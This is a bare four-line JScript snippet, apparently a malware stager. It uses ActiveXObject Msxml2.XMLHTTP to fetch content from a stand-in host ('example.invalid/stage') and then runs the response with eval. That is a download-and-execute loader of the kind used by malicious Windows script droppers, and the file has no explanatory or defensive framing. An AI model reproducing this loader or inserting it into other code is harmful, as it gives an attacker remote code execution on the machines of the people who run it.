var xhr = new ActiveXObject("Msxml2.XMLHTTP");
xhr.open("GET", "https://example.invalid/stage", false);
xhr.send();
eval(xhr.responseText);
